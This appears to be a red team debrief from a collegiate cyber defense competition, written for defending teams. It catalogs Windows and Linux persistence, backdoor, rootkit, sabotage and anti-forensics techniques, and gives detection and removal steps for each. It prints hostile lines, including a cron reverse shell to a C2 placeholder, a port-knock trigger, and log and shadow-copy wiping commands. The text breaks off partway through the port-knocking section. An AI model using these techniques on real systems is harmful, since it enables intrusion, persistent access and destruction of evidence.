@@ -1,0 +1,887 @@
+================================================================================
+  CCDC RED TEAM — PHASE 2 DEBRIEF
+  Date: 10-24
+  Scope: Phase 2 combined scripts only
+         Windows: CCDC_Windows_P2_COMBINED.ps1
+         Linux:   CCDC_Linux_COMBINED.sh
+
+  Default C2 IP used: 172.31.40.6
+  (change this value per-run in the OPERATOR CONFIG block at top of each script)
+
+  This document catalogs every technique deployed during Phase 2.
+  For each item you will find:
+    - What it is and what MITRE technique it maps to
+    - What it was called on your system (service names, file paths, task names)
+    - Where to look for it on your box
+    - How to stop and remove it
+
+  NOTE: If the anti-forensics module ran (MemoryHole / VanishingAct), your
+  event logs, shell history, and prefetch will have gaps. The PERSISTENT
+  mechanisms below (services, tasks, files, iptables rules) are NOT removed
+  by anti-forensics — hunt for those directly.
+================================================================================
+
+
+================================================================================
+  WINDOWS PHASE 2
+  Script: CCDC_Windows_P2_COMBINED.ps1
+  Modules: ServiceSmasher, WhosThere, BackgroundBeef,
+           ChocolateFactory, MemoryHole
+  Staging directory: C:\Windows\System32\spool\drivers\color\
+  State file:        C:\Windows\System32\spool\drivers\color\.p2_state.csv
+================================================================================
+
+
+--------------------------------------------------------------------------------
+  MODULE 1 — ServiceSmasher (T1489)
+  3-layer service sabotage: stop+disable / config corruption / firewall+task
+--------------------------------------------------------------------------------
+
+SERVICE: DNS Server
+  What was done:
+    Layer 1 — DNS Server service stopped and set to Disabled
+              Registry key set: HKLM:\SYSTEM\CurrentControlSet\Services\DNS\
+                Parameters\ListenAddresses = 127.0.0.99 (nonexistent NIC)
+    Layer 2 — All .dns zone files in C:\Windows\System32\dns\ overwritten with
+              a broken SOA record that prevents zone load
+              cache.dns (root hints) cleared
+    Layer 3 — Windows Firewall rules added blocking TCP 53 and UDP 53 (inbound
+              and outbound)
+              NETWORK SERVICE account denied ACL on C:\Windows\System32\dns\
+              Scheduled task installed: CCDC-DNS-Redeploy
+                Runs every 5 minutes, re-applies all layers above
+
+  Where to find it:
+    Task Scheduler > Task Scheduler Library > CCDC-DNS-Redeploy
+    Registry: HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters
+              check ListenAddresses value
+    Zone files: C:\Windows\System32\dns\  (open any .dns file — broken SOA)
+    Firewall:   wf.msc or
+                Get-NetFirewallRule | Where-Object { $_.DisplayName -match "53" }
+
+  How to stop and recover:
+    1. Delete CCDC-DNS-Redeploy scheduled task FIRST (or it will re-sabotage)
+       schtasks /delete /tn "CCDC-DNS-Redeploy" /f
+    2. Remove firewall rules blocking port 53
+    3. Restore zone files from backup or recreate via DNS Manager
+    4. Delete the ListenAddresses registry value (or set to your server IP)
+    5. Re-enable and start DNS Server service
+       Set-Service DNS -StartupType Automatic; Start-Service DNS
+
+
+SERVICE: IIS FTP (FTPSVC / MSFTPSVC)
+  What was done:
+    Layer 1 — FTPSVC and MSFTPSVC services stopped and disabled
+              Default FTP Site stopped via appcmd
+    Layer 2 — FTP site binding changed to 192.0.2.1:21 (nonroutable IP, RFC5737)
+              All FTP authorization rules cleared
+              basicAuthentication disabled in applicationHost.config
+    Layer 3 — Firewall blocks TCP 21 and TCP 50000-50100 (passive data range)
+              Everyone account denied full control on ftproot directory
+              Scheduled task: CCDC-FTP-Redeploy (every 5 min)
+
+  Where to find it:
+    Task Scheduler > CCDC-FTP-Redeploy
+    IIS Manager > Default FTP Site > Bindings  (will show 192.0.2.1:21)
+    Firewall: rules blocking port 21
+    ftproot ACL: icacls C:\inetpub\ftproot
+
+  How to stop and recover:
+    1. schtasks /delete /tn "CCDC-FTP-Redeploy" /f
+    2. Remove firewall rules for port 21 and 50000-50100
+    3. In IIS Manager, rebind FTP site to the correct server IP
+    4. Re-enable basicAuthentication and restore auth rules
+    5. Reset ftproot ACL: icacls C:\inetpub\ftproot /reset /t
+    6. Set-Service FTPSVC -StartupType Automatic; Start-Service FTPSVC
+
+
+SERVICE: IIS Web (W3SVC / HTTP)
+  What was done:
+    Layer 1 — W3SVC stopped and disabled; iisreset /stop
+    Layer 2 — Default Web Site binding changed to 192.0.2.1:80 (nonroutable)
+              DefaultAppPool identity set to nonexistent random username/password
+              Malicious web.config planted in wwwroot referencing a nonexistent
+              BrokenHttpModule (IIS will refuse to start the site even if fixed)
+    Layer 3 — Firewall blocks TCP 80 and TCP 443
+              IIS_IUSRS and IUSR accounts denied Read on C:\inetpub\wwwroot
+              Scheduled task: CCDC-IIS-Redeploy (every 5 min)
+
+  Where to find it:
+    Task Scheduler > CCDC-IIS-Redeploy
+    IIS Manager > Default Web Site > Bindings  (will show 192.0.2.1:80)
+    C:\inetpub\wwwroot\web.config  (look for BrokenHttpModule)
+    IIS Manager > Application Pools > DefaultAppPool > Advanced Settings >
+      Identity  (will show an unknown user)
+    Firewall: rules blocking port 80 and 443
+    wwwroot ACL: icacls C:\inetpub\wwwroot
+
+  How to stop and recover:
+    1. schtasks /delete /tn "CCDC-IIS-Redeploy" /f
+    2. Remove firewall rules for port 80 and 443
+    3. Delete or fix C:\inetpub\wwwroot\web.config  (remove BrokenHttpModule)
+    4. Reset DefaultAppPool identity to ApplicationPoolIdentity
+    5. Rebind Default Web Site to the correct IP and port 80
+    6. Reset wwwroot ACL: icacls C:\inetpub\wwwroot /reset /t
+    7. Set-Service W3SVC -StartupType Automatic; Start-Service W3SVC
+
+
+SERVICE: LDAP / Active Directory
+  What was done:
+    Layer 1 — Firewall rules block TCP/UDP 389 (LDAP), TCP 636 (LDAPS),
+              TCP 3268 (Global Catalog), TCP 3269 (Global Catalog SSL)
+    Layer 2 — NTDS Parameters registry values all set to 1 (effective limit):
+                MaxConnections      = 1
+                MaxPageSize         = 1
+                MaxQueryDuration    = 1
+                MaxTempTableSize    = 1
+                MaxConnIdleTime     = 1
+              This degrades AD query throughput to near-zero without stopping NTDS
+    Layer 3 — LDAP server signing enforced (LDAPServerIntegrity = 2)
+              LDAP channel binding enforced (LdapEnforceChannelBinding = 2)
+              Clients that don't support signing/channel binding are rejected
+
+  Where to find it:
+    Registry: HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters
+              check MaxConnections, MaxPageSize, MaxQueryDuration, etc.
+    Registry: HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters
+              LDAPServerIntegrity and LdapEnforceChannelBinding
+    Firewall: rules blocking ports 389, 636, 3268, 3269
+
+  How to stop and recover:
+    1. Remove firewall rules blocking LDAP ports
+    2. Restore NTDS parameters to normal values:
+         MaxConnections  = 5000 (or delete value to use default)
+         MaxPageSize     = 1000
+         MaxQueryDuration = 120
+         MaxTempTableSize = 10000
+         MaxConnIdleTime = 900
+    3. To revert signing enforcement:
+         LDAPServerIntegrity = 1 (or 0 to disable)
+         LdapEnforceChannelBinding = 0
+    4. Restart NTDS or reboot DC for NTDS parameter changes to take full effect
+
+
+--------------------------------------------------------------------------------
+  MODULE 2 — WhosThere (T1205.001)
+  Magic-packet backdoor — no persistent open port
+  Fires reverse shell when UDP magic bytes DE AD BE EF are received
+--------------------------------------------------------------------------------
+
+  What was done:
+    Npcap 1.79 installed (raw packet capture driver — required for UDP sniffing)
+    C# sniffer service compiled IN MEMORY at runtime and dropped as:
+      C:\Windows\System32\spool\drivers\color\ndisflt.exe
+      (file attributes: Hidden + System; ACL restricted to SYSTEM only)
+    Windows service registered:
+      Service name:    NdisFilterHelper
+      Display name:    Network Driver Interface Specification Filter Helper
+      Startup type:    Automatic
+      Recovery:        Restart on failure x3
+    The service opens a raw IP socket, monitors ALL incoming UDP traffic, and
+    triggers a reverse shell to C2:WhosThere_Port on any packet whose first
+    4 bytes are DE AD BE EF
+    Outbound firewall rule added:
+      Name: Windows Network Diagnostics (TCP-Out)
+      (allows the reverse shell outbound connection)
+
+  Where to find it:
+    Services:
+      sc query NdisFilterHelper
+      OR: services.msc > look for "Network Driver Interface Specification
+          Filter Helper"
+    File (hidden — must use /a flag):
+      dir /a C:\Windows\System32\spool\drivers\color\
+      Look for: ndisflt.exe
+    Firewall:
+      Get-NetFirewallRule -DisplayName "Windows Network Diagnostics*"
+      OR: wf.msc > Outbound Rules > "Windows Network Diagnostics (TCP-Out)"
+    Npcap:
+      Control Panel > Programs > Npcap (version 1.79)
+
+  How to stop and remove:
+    sc stop NdisFilterHelper
+    sc delete NdisFilterHelper
+    del /f /a "C:\Windows\System32\spool\drivers\color\ndisflt.exe"
+    Remove firewall rule "Windows Network Diagnostics (TCP-Out)"
+    Uninstall Npcap via Control Panel > Programs & Features
+
+
+--------------------------------------------------------------------------------
+  MODULE 3 — BackgroundBeef (T1197)
+  Self-healing BITS persistence — two independent mechanisms, each resurrects
+  the other. Windows Update infrastructure carries the payload.
+--------------------------------------------------------------------------------
+
+  What was done:
+    3 files dropped to C:\Windows\System32\spool\drivers\color\
+    (all Hidden + System attributes; ACL restricted to SYSTEM only):
+      wu-cache.ps1     — TCP reverse shell payload
+      wu-telemetry.ps1 — BITS download target (refreshed from C2 on each pull)
+      wu-notify.ps1    — BITS completion notification handler; re-creates the
+                         BITS job automatically, creating an infinite pull loop
+
+    BITS job created:
+      Name: WindowsUpdateTelemetry
+      Pulls wu-telemetry.ps1 from http://C2:8080/wu-telemetry.ps1
+      On completion: runs wu-notify.ps1 (which re-creates the job)
+
+    Scheduled task created:
+      Path: \Microsoft\Windows\WindowsUpdate\USOSessionWorker
+      NOTE: This REPLACES the real USOSessionWorker task name (check the
+            action — legitimate task runs USOSessionWorker.exe, not a .ps1)
+      Runs wu-notify.ps1 every 30 minutes, at system startup, and at logon
+
+    Outbound firewall rules added:
+      "Windows Update Health Check"
+      "Windows Update Service Agent"
+
+  Where to find it:
+    BITS job:
+      bitsadmin /list /allusers
+      Look for: WindowsUpdateTelemetry
+    Files (hidden — use /a flag):
+      dir /a C:\Windows\System32\spool\drivers\color\
+      Look for: wu-cache.ps1, wu-telemetry.ps1, wu-notify.ps1
+    Scheduled task:
+      Task Scheduler > \Microsoft\Windows\WindowsUpdate\USOSessionWorker
+      Check the Action — if it runs a .ps1 file instead of USOSessionWorker.exe
+      it has been replaced
+    Firewall:
+      Get-NetFirewallRule | Where { $_.DisplayName -match "Windows Update" }
+      Look for "Windows Update Health Check" and "Windows Update Service Agent"
+
+  How to stop and remove:
+    bitsadmin /cancel "WindowsUpdateTelemetry"
+    OR: Get-BitsTransfer -AllUsers | Where { $_.DisplayName -eq
+        "WindowsUpdateTelemetry" } | Remove-BitsTransfer
+    schtasks /delete /tn "\Microsoft\Windows\WindowsUpdate\USOSessionWorker" /f
+    Remove the two firewall rules
+    del /f /a "C:\Windows\System32\spool\drivers\color\wu-cache.ps1"
+    del /f /a "C:\Windows\System32\spool\drivers\color\wu-telemetry.ps1"
+    del /f /a "C:\Windows\System32\spool\drivers\color\wu-notify.ps1"
+    Block outbound to C2 IP on port 8080
+
+
+--------------------------------------------------------------------------------
+  MODULE 4 — ChocolateFactory (T1072)
+  Weaponized Chocolatey — malicious package disguised as a Windows telemetry
+  update re-fires a reverse shell on every upgrade cycle (every 30 min)
+--------------------------------------------------------------------------------
+
+  What was done:
+    Chocolatey package manager installed (or hijacked if already present)
+
+    Rogue package source registered:
+      Name:     WinCorpUpdates
+      Path:     C:\Windows\System32\spool\drivers\color\pkgs\
+      Priority: 0  (highest — checked before official Chocolatey repo)
+
+    Malicious package built and installed:
+      Package name:  windows-telemetry-core  version 3.2.1
+      File:          windows-telemetry-core.3.2.1.nupkg
+      When installed or upgraded, its chocolateyInstall.ps1 executes an
+      encoded reverse shell back to C2
+
+    Scheduled task created:
+      Path: \Microsoft\Windows\WindowsUpdate\ChocolateyMaintenance
+      Runs: choco upgrade windows-telemetry-core --force
+      Schedule: every 30 minutes, at startup, and at logon
+      Effect: the payload re-fires every single time this task runs
+
+    If PDQ Deploy was present on the system:
+      Fake package file dropped into PDQ's package directory:
+        WinSecUpdate-KB5031354.pdq
+      This causes PDQ to execute the payload during its next deployment cycle
+
+  Where to find it:
+    Chocolatey source:
+      choco source list
+      Look for: WinCorpUpdates
+    Package directory:
+      dir C:\Windows\System32\spool\drivers\color\pkgs\
+    Installed package:
+      choco list  (look for windows-telemetry-core)
+    Scheduled task:
+      Task Scheduler > \Microsoft\Windows\WindowsUpdate\ChocolateyMaintenance
+    PDQ (if applicable):
+      PDQ Deploy > Packages > look for WinSecUpdate-KB5031354
+
+  How to stop and remove:
+    schtasks /delete /tn "\Microsoft\Windows\WindowsUpdate\ChocolateyMaintenance" /f
+    choco source remove --name WinCorpUpdates
+    choco uninstall windows-telemetry-core -y
+    rmdir /s /q "C:\Windows\System32\spool\drivers\color\pkgs"
+    Remove WinSecUpdate-KB5031354.pdq from PDQ package directory if present
+
+
+--------------------------------------------------------------------------------
+  MODULE 5 — MemoryHole (T1070)
+  Anti-forensics — evidence eraser, always runs LAST, passphrase-gated
+  If this module ran, logs and history are gone — but the ARTIFACTS above
+  (services, tasks, files) are NOT removed and can still be found
+--------------------------------------------------------------------------------
+
+  What was done (if this module ran):
+    All Windows event logs cleared via wevtutil el for every channel
+    Including: Security, System, Application, PowerShell/Operational,
+               Sysmon/Operational, Windows Defender, Task Scheduler,
+               WMI-Activity, BITS-Client
+    PowerShell command history deleted for every user profile
+      (AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\
+       ConsoleHost_history.txt)
+    Recent items (shell:recent) cleared
+    File timestamps of all Phase 2 artifact files SET TO MATCH ntdll.dll
+      (~2019 era) — they will appear to be old system files
+    C:\Windows\Prefetch\ all .pf files deleted
+    Shimcache (AppCompatCache) registry key wiped:
+      HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\
+        AppCompatCache\AppCompatCache
+    All shadow copies deleted:
+      vssadmin delete shadows /all /quiet
+    Windows Defender exclusion added for:
+      C:\Windows\System32\spool\drivers\color\
+      ndisflt.exe
+    Sysmon service stopped; Sysmon Operational event log cleared
+    Registry MRU entries cleared:
+      Explorer\RecentDocs, RunMRU, TypedPaths, IE TypedURLs
+    NdisFilterHelper service key removed from registry (service file stays)
+    ChocolateFactory telemetry registry marker removed
+    Staging temp directories (rt_* and chocobuild_*) overwritten and deleted
+
+  Signs that MemoryHole ran on your box:
+    Event Viewer > Windows Logs — all empty, or large unexplained time gaps
+    vssadmin list shadows  — returns "No items found"
+    C:\Windows\Prefetch\  — empty or has only recent (post-attack) entries
+    reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\
+      AppCompatCache" /v AppCompatCache  — key missing or empty
+    Windows Defender exclusion list includes spool\drivers\color
+    File timestamps on C:\Windows\System32\spool\drivers\color\ files
+      all show creation/modification dates circa 2019 even if just created
+    Get-MpPreference | select ExclusionPath  — shows color\ directory
+
+  State file (may survive even if MemoryHole ran):
+    C:\Windows\System32\spool\drivers\color\.p2_state.csv
+    Contains timestamps and success/failure status for each module run
+
+
+================================================================================
+  LINUX PHASE 2
+  Script: CCDC_Linux_COMBINED.sh
+  Modules: KernelSneak, DockerPoisoner, BootStrap, PTraced,
+           BrokenClock, ChefMischief, KnockKnock, VanishingAct
+  State file: /var/lib/.p2_state
+  Default C2 ports:
+    4444 — DockerPoisoner reverse shell
+    4445 — PTraced reverse shell
+    4446 — BootStrap reverse shell
+    4443 — ChefMischief / infra-health-check cron reverse shell
+    4448 — KnockKnock trigger reverse shell
+================================================================================
+
+
+--------------------------------------------------------------------------------
+  MODULE 1 — KernelSneak (T1014)
+  ftrace-based LKM rootkit — hides processes, files, and TCP connections
+  at the kernel level. Standard tools lie to you while it is loaded.
+--------------------------------------------------------------------------------
+
+  What was done:
+    C kernel module compiled from source against the running kernel headers
+    Module loaded into the live kernel via insmod
+    Module hides:
+      - Specified PIDs from /proc/ and ps/top output
+      - Specified filenames from directory listings
+      - TCP port entries from /proc/net/tcp (ports 4444-4447 hidden)
+    Module name disguised to resemble a legitimate kernel subsystem
+    If kernel headers unavailable:
+      Falls back to LD_PRELOAD shared library in /etc/ld.so.preload that
+      intercepts libc readdir/fopen calls to hide files and connections
+    If Secure Boot was enabled:
+      mokutil was used to queue a Secure Boot disable (password: ccdc2026)
+      Operator was prompted at MOK manager on next boot
+
+  Where to find it:
+    Loaded module (may be hidden from lsmod itself):
+      lsmod  — compare against a known-good system; gaps indicate hidden module
+      Find the compiled .ko file:
+        find /lib/modules/$(uname -r) -name "*.ko" -newer /boot/vmlinuz*
+    LD_PRELOAD fallback:
+      cat /etc/ld.so.preload
+      Look for any .so path that is not standard system library
+    Hidden connections (cross-check to detect hiding):
+      Compare: ss -antp  vs  cat /proc/net/tcp  (hex port values)
+      Discrepancies = rootkit hiding a port
+    Secure Boot:
+      mokutil --sb-state
+      Check EFI boot log for MOK manager prompt at last reboot
+
+  How to stop and remove:
+    If module is visible: rmmod <module_name>
+    If hidden: reboot (removes loaded module from memory)
+    Remove the .ko file from disk to prevent re-load:
+      find / -name "*.ko" -newer /boot/vmlinuz* -delete  (verify before running)
+    Check /etc/modules and /etc/modules-load.d/ for auto-load entries
+    Check /etc/ld.so.preload and remove any suspicious entries
+    If Secure Boot was disabled via MOK: re-enable in BIOS/UEFI firmware
+    See also BootStrap module — rootkit may be loaded from initramfs
+
+
+--------------------------------------------------------------------------------
+  MODULE 2 — DockerPoisoner (T1525)
+  Malicious layer injected into Docker base images. Any container spawned
+  from a compromised image inherits the payload. Can escape to host via
+  privileged container technique.
+--------------------------------------------------------------------------------
+
+  What was done:
+    Docker base images on the host (ubuntu, alpine, etc.) pulled and
+    rebuilt with an additional malicious layer that:
+      - Installs a privileged container escape mechanism
+      - Establishes reverse shell back to C2 on port 4444 when container runs
+    Attacker SSH public key added to /root/.ssh/authorized_keys on the HOST
+    (planted during container build process with host volume mount)
+    Original image tags overwritten with the poisoned versions
+
+  Where to find it:
+    Image integrity:
+      docker images  — note image IDs and creation dates
+      Compare SHA256 digests against official Docker Hub:
+        docker inspect <image> | grep -i digest
+    Layer history:
+      docker history <image>  — look for extra layers, unusual commands,
+      or a layer with a suspicious timestamp compared to official release
+    SSH key:
+      cat /root/.ssh/authorized_keys  — look for unknown keys
+      cat /home/*/.ssh/authorized_keys
+    Running containers:
+      docker ps -a  — look for unexpected containers or privileged containers
+      docker inspect <container> | grep -i privileged
+
+  How to stop and remove:
+    docker rmi <compromised_image_name>  (forces pull of clean version next use)
+    For each image: docker pull <image>  (re-pulls from Docker Hub, clean layer)
+    Remove attacker SSH key from /root/.ssh/authorized_keys
+      (compare against your team's known authorized keys)
+    Audit all running containers: docker ps -a
+    Kill and remove any suspicious containers: docker rm -f <container_id>
+
+
+--------------------------------------------------------------------------------
+  MODULE 3 — BootStrap (T1542.001)
+  initramfs hook — runs BEFORE the OS fully starts on every boot.
+  Survives service restarts and most re-imaging. Only verified media
+  re-imaging of the boot partition fully removes it.
+--------------------------------------------------------------------------------
+
+  What was done:
+    A malicious hook script added to the initramfs build path:
+      Ubuntu:      /etc/initramfs-tools/hooks/<script_name>
+      Fedora/RHEL: /etc/dracut.conf.d/ or /usr/lib/dracut/modules.d/
+    initramfs rebuilt to include the hook:
+      Ubuntu:      update-initramfs -u
+      Fedora/RHEL: dracut --force
+    The hook runs as root before systemd starts and:
+      - Plants attacker SSH public key in /root/.ssh/authorized_keys
+      - Fires TCP reverse shell to C2 on port 4446
+
+  Where to find it:
+    Hook file (Ubuntu):
+      ls /etc/initramfs-tools/hooks/
+      Look for scripts that are not standard Ubuntu hooks
+    Hook file (Fedora/RHEL):
+      ls /etc/dracut.conf.d/
+      ls /usr/lib/dracut/modules.d/
+    Inside the initramfs image (Ubuntu):
+      lsinitramfs /boot/initrd.img-$(uname -r) | grep -v "^usr\|^lib\|^bin\|^etc/ld"
+      Look for unexpected script names
+    Inside the initramfs image (Fedora/RHEL):
+      lsinitrd /boot/initramfs-$(uname -r).img
+      Look for unexpected scripts or modules
+    SSH key:
+      cat /root/.ssh/authorized_keys
+
+  How to stop and remove:
+    1. Identify and remove the hook script from the hooks directory
+    2. Rebuild initramfs without the hook:
+         Ubuntu:      update-initramfs -u -k $(uname -r)
+         Fedora/RHEL: dracut --force /boot/initramfs-$(uname -r).img $(uname -r)
+    3. Remove attacker SSH key from /root/.ssh/authorized_keys
+    4. Verify /boot partition integrity if possible
+    5. If in doubt: boot from trusted live media and rebuild from there
+
+
+--------------------------------------------------------------------------------
+  MODULE 4 — PTraced (T1055.008)
+  ptrace process injection into systemd-journald (or similar trusted process).
+  Runs entirely in an existing process — no new file, no new process visible.
+  Does NOT survive process restart.
+--------------------------------------------------------------------------------
+
+  What was done:
+    Identified a running trusted SUID process (typically systemd-journald)
+    Attached to that process via ptrace(PTRACE_ATTACH, pid)
+    Injected shellcode directly into the process's memory space via
+    PTRACE_POKETEXT/PTRACE_SETREGS
+    The shellcode opens a TCP reverse shell to C2 on port 4445
+    The shellcode runs inside the victim process's existing thread —
+    it appears in ps as the legitimate process (systemd-journald)
+
+  Where to find it:
+    Unexpected outbound network connection from trusted process:
+      ss -antp | grep systemd-journald
+      ss -antp | grep -v "127.0.0.1"
+      Look for any established outbound connection from a process that
+      should not be making network connections
+    Injected memory region (rwx pages are unusual):
+      cat /proc/<pid>/maps | grep rwx
+      Legitimate processes almost never have read-write-execute mapped regions
+    strace a suspicious process briefly:
+      strace -p <pid> -e trace=network 2>&1 | head -20
+      Look for connect() syscalls from a non-networking process
+    Open file descriptors (sockets):
+      lsof -p <pid> | grep -i sock
+
+  How to stop and remove:
+    Kill and restart the injected process:
+      systemctl restart systemd-journald
+    The injected shellcode lives ONLY in memory and is gone on restart
+    No file to remove — clean up by restarting the affected process
+
+
+--------------------------------------------------------------------------------
+  MODULE 5 — BrokenClock (T1489)
+  3-layer service sabotage on all 5 scored services.
+  IMPORTANT: chattr +i is used on config files. You CANNOT edit them until
+  you remove the immutable flag with: chattr -i <file>
+--------------------------------------------------------------------------------
+
+SERVICE: Dovecot (IMAP/POP3)  Ports: 110, 143, 993, 995
+  What was done:
+    Layer 1 — systemctl stop dovecot && systemctl mask dovecot
+    Layer 2 — SSL certificate path in config set to a nonexistent file
+              listen = 127.0.0.1  (loopback-only binding)
+              chattr +i applied to /etc/dovecot/dovecot.conf
+    Layer 3 — iptables DROP rules for ports 110, 143, 993, 995
+
+  Where to find it:
+    systemctl status dovecot
+    lsattr /etc/dovecot/dovecot.conf  (look for 'i' flag = immutable)
+    iptables -L -n | grep -E "110|143|993|995"
+
+  How to stop and recover:
+    chattr -i /etc/dovecot/dovecot.conf
+    Restore original dovecot.conf from backup
+    iptables -D INPUT -p tcp --dport 110 -j DROP  (repeat for 143, 993, 995)
+    systemctl unmask dovecot && systemctl start dovecot
+
+
+SERVICE: Postfix (SMTP)  Ports: 25, 587, 465
+  What was done:
+    Layer 1 — systemctl stop postfix && systemctl mask postfix
+    Layer 2 — inet_interfaces = loopback-only (main.cf)
+              TLS cert path corrupted; master.cf broken
+              chattr +i on /etc/postfix/main.cf
+    Layer 3 — iptables DROP rules for ports 25, 587, 465
+
+  Where to find it:
+    systemctl status postfix
+    lsattr /etc/postfix/main.cf  (look for 'i' flag)
+    iptables -L -n | grep -E " 25 | 587 | 465"
+
+  How to stop and recover:
+    chattr -i /etc/postfix/main.cf
+    Restore main.cf from backup
+    Flush iptables rules for ports 25, 587, 465
+    systemctl unmask postfix && systemctl start postfix
+
+
+SERVICE: Apache / httpd (HTTP)  Ports: 80, 443
+  What was done:
+    Layer 1 — systemctl stop apache2 (or httpd) && systemctl mask apache2
+    Layer 2 — Listen directive changed to a wrong port in ports.conf
+              Broken Include directive added to main config
+              chattr +i on ports.conf (Ubuntu) or httpd.conf (Fedora/RHEL)
+    Layer 3 — iptables DROP rules for ports 80 and 443
+
+  Where to find it:
+    systemctl status apache2  or  systemctl status httpd
+    lsattr /etc/apache2/ports.conf  or  lsattr /etc/httpd/conf/httpd.conf
+    iptables -L -n | grep -E " 80 | 443"
+
+  How to stop and recover:
+    chattr -i /etc/apache2/ports.conf  (or httpd.conf path)
+    Restore config file from backup (fix Listen directive; remove broken Include)
+    Flush iptables rules for ports 80 and 443
+    systemctl unmask apache2 && systemctl start apache2
+
+
+SERVICE: Splunk  Ports: 8000, 8089, 9997
+  What was done:
+    Layer 1 — Splunk service stopped and masked
+    Layer 2 — /opt/splunk/etc/system/local/web.conf broken:
+              bad SSL certificate paths, wrong port config
+    Layer 3 — iptables DROP for ports 8000, 8089, 9997
+              Cron job installed to stop Splunk every 3 minutes:
+              Check /etc/cron.d/ for an entry killing splunk/splunkd
+
+  Where to find it:
+    systemctl status splunk  or  /opt/splunk/bin/splunk status
+    cat /opt/splunk/etc/system/local/web.conf
+    ls /etc/cron.d/  (look for a cron entry mentioning splunk or splunkd)
+    iptables -L -n | grep -E "8000|8089|9997"
+
+  How to stop and recover:
+    Remove the cron entry in /etc/cron.d/ that kills Splunk (do this FIRST)
+    Restore /opt/splunk/etc/system/local/web.conf from backup
+    Flush iptables rules for ports 8000, 8089, 9997
+    systemctl unmask splunk && systemctl start splunk
+
+
+SERVICE: OpenCart / MySQL  Port: 3306
+  What was done:
+    Layer 1 — Database credentials corrupted in OpenCart config.php
+              .htaccess added to OpenCart web root: deny from all
+    Layer 2 — DROP DATABASE executed against the OpenCart database
+              chattr +i on config.php
+    Layer 3 — iptables DROP for port 3306
+
+  Where to find it:
+    lsattr /var/www/html/config.php  (or wherever OpenCart is installed)
+    cat /var/www/html/.htaccess  (look for deny from all)
+    mysql -u root -e "SHOW DATABASES;"  (OpenCart DB will be missing)
+    iptables -L -n | grep 3306
+
+  How to stop and recover:
+    chattr -i /var/www/html/config.php
+    Restore database from backup (DROP DATABASE cannot be undone)
+    Restore config.php with correct DB credentials
+    Remove or fix .htaccess deny rule
+    Flush iptables rule for port 3306
+
+
+--------------------------------------------------------------------------------
+  MODULE 6 — ChefMischief (T1072)
+  Weaponized Chef Infrastructure Automation disguised as legitimate
+  "Platform Engineering" baseline hardening. Re-applies all sabotage
+  every 15 minutes via systemd timer. Creates a backdoor sudo user
+  and fires a reverse shell cron every 30 minutes.
+--------------------------------------------------------------------------------
+
+  What was done (PRIMARY path — Chef available):
+    Chef installed via omnitruck (or hijacked if already present)
+
+    Malicious cookbook deployed:
+      Path: /var/chef/cookbooks/base_config/recipes/default.rb
+      Disguised as: "Baseline OS configuration and compliance hardening"
+                    maintainer: Platform Engineering
+      What it actually does every 15-minute run:
+        - Stops and disables: postfix, dovecot, splunk, splunkd, apache2/httpd
+        - Writes attacker SSH key to /root/.ssh/authorized_keys
+        - Creates sudo user: sysmon  (described as "System Monitoring Service")
+        - Installs cron infra-health-check: reverse shell to C2:4443 every 30 min
+        - Creates sysmon SSH authorized_keys with attacker key
+
+    Chef client config: /etc/chef/client.rb  (if Chef was NOT present before,
+      this file is new; if it was, the original is backed up as client.rb.bak)
+
+    systemd timer installed:
+      Name: chef-maint.timer
+      Runs chef-client every 15 minutes, 2 minutes after boot, and persists
+      across reboots
+
+    Cron job: /etc/cron.d/infra-health-check
+      */30 * * * *  root  bash -c 'bash -i >& /dev/tcp/C2/4443 0>&1'
+
+    Rogue sudo user: sysmon
+      Comment: "System Monitoring Service"  (makes it look legitimate)
+      Has full sudo access on all distros (sudo/wheel groups)
+      SSH key planted in /home/sysmon/.ssh/authorized_keys
+
+  What was done (FALLBACK path — no internet / Chef unavailable):
+    Bash payload script: /usr/lib/.sysops/infra_maint.sh
+      (does the same job: kill services, plant SSH key, maintain sysmon user)
+      Directory hidden in /usr/lib/ to blend with system paths
+    systemd timer: infra-maint.timer (every 15 min, same behavior)
+    Cron: /etc/cron.d/infra-health-check  (same reverse shell, same port)
+
+  Where to find it:
+    Chef cookbook:
+      ls /var/chef/cookbooks/base_config/recipes/default.rb
+      cat /var/chef/cookbooks/base_config/recipes/default.rb
+    Chef timer:
+      systemctl list-timers | grep chef
+      systemctl status chef-maint.timer
+    Fallback script:
+      ls /usr/lib/.sysops/
+      cat /usr/lib/.sysops/infra_maint.sh
+    Fallback timer:
+      systemctl list-timers | grep infra
+    Cron (both paths):
+      cat /etc/cron.d/infra-health-check
+    Rogue user:
+      id sysmon
+      getent passwd sysmon
+      cat /etc/sudoers.d/99-sysmon  (may exist if fallback ran)
+    SSH keys:
+      cat /root/.ssh/authorized_keys
+      cat /home/sysmon/.ssh/authorized_keys
+
+  How to stop and remove:
+    systemctl disable --now chef-maint.timer  (or infra-maint.timer)
+    rm -rf /var/chef/cookbooks/base_config
+    rm -f /etc/cron.d/infra-health-check
+    rm -rf /usr/lib/.sysops  (if fallback was used)
+    userdel -r sysmon
+    rm -f /etc/sudoers.d/99-sysmon
+    Remove attacker SSH key from /root/.ssh/authorized_keys
+    Optionally: restore /etc/chef/client.rb from client.rb.bak if Chef was
+      legitimately in use before the attack
+
+
+--------------------------------------------------------------------------------
+  MODULE 7 — KnockKnock (T1205.001)
+  3-stage iptables port-knock backdoor. No port is ever open — knocking
+  the correct sequence fires a root reverse shell. Survives reboots.
+--------------------------------------------------------------------------------
+
+  What was done:
+    iptables rules installed using the --recent module:
+      3 custom chains: KNOCK_STAGE1, KNOCK_STAGE2, KNOCK_STAGE3
+      Knock sequence: hit port 7001, then 7002, then 7003 within 10 seconds
+      A successful 3-stage knock triggers a one-shot reverse shell to C2:4448
+    Rules persisted to: /etc/iptables/knockknock.rules
+    Cron restores rules at every reboot:
+      /etc/cron.d/iptables-compat-restore  (@reboot iptables-restore)
+    systemd units installed:
+      ufw-compat.service    — listener service
+      iptables-compat.service — shell trigger service
+
+  Trigger command (for reference, from attacker machine):
+    for p in 7001 7002 7003; do nc -zw1 <target_ip> $p 2>/dev/null; sleep 0.3; done
+
+  Where to find it:
+    iptables chains:
+      iptables -L -n
+      Look for chains named KNOCK_STAGE1, KNOCK_STAGE2, KNOCK_STAGE3
+    Saved rules file:
+      cat /etc/iptables/knockknock.rules
